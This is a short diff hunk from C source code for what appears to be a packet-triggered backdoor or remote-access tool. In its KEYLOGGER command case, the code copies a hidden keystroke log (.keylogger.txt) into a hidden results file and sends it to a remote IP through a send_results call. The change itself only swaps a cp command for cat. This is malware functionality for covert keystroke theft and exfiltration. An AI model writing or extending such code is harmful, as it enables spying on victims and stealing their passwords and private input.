@@ -176,7 +176,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
             case KEYLOGGER:
                 printf("KEYLOGGER\n");
                 //copy keylogger file to results file
-                system("cp .keylogger.txt .results");
+                system("cat .keylogger.txt > .results");
                 send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
                 break;
             case INOTIFY:
